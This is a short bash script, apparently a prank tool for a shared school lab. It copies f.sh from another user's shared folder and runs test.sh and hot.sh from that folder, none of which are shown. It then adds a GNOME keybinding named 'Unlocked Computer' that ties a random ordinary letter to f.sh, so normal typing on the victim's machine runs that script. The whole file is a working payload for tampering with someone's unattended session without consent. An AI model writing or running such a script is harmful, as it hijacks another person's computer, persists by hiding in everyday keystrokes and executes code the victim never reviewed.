#!/bin/bash

cp /sgoinfre/students/jose-an2/f.sh ~/Documents/f.sh
/sgoinfre/students/jose-an2/test.sh
/sgoinfre/students/jose-an2/hot.sh

NAME="Unlocked Computer"
COMMAND="$HOME/Documents/f.sh"

SCHEMA="org.gnome.settings-daemon.plugins.media-keys"
KEY="custom-keybindings"
BASE="/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings"

RAND_CHAR=$(tr -dc 'abcdfghjklmnopqrsuvwxyz' </dev/urandom | head -c1)

BINDING="$RAND_CHAR"

current=$(gsettings get $SCHEMA $KEY)

index=0
while echo "$current" | grep -q "custom$index/"; do
    index=$((index + 1))
done

NEW_PATH="$BASE/custom$index/"

if [ "$current" = "@as []" ] || [ "$current" = "[]" ]; then
    gsettings set $SCHEMA $KEY "['$NEW_PATH']"
else
    updated=$(echo "$current" | sed "s|]$|, '$NEW_PATH']|")
    gsettings set $SCHEMA $KEY "$updated"
fi

gsettings set $SCHEMA.custom-keybinding:$NEW_PATH name "$NAME"
gsettings set $SCHEMA.custom-keybinding:$NEW_PATH command "$COMMAND"
gsettings set $SCHEMA.custom-keybinding:$NEW_PATH binding "$BINDING"
